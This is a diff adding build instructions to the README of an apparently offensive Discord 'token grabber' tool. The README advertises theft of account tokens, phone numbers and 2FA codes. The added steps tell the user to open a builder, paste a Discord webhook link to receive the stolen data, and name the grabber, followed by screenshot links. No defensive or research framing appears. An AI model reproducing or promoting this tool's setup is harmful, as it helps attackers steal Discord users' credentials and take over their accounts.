@@ -12,5 +12,16 @@ The most powerful token grabber
   - Phone
   - New 2FA Codes
   - 2FA Enable / Disable
-- And much more
+- And much more soon
 
+# How to build ?
+- Open [DFucker Builder]()
+- Put your [webhook link](https://help.dashe.io/en/articles/2521940-how-to-create-a-discord-webhook-url)
+- Put a name to your grabber
+- Enjoy !
+
+# Some screenshots
+
+![image](https://cdn.discordapp.com/attachments/807584504935743489/807598969151553556/unknown.png)
+
+![cc]()
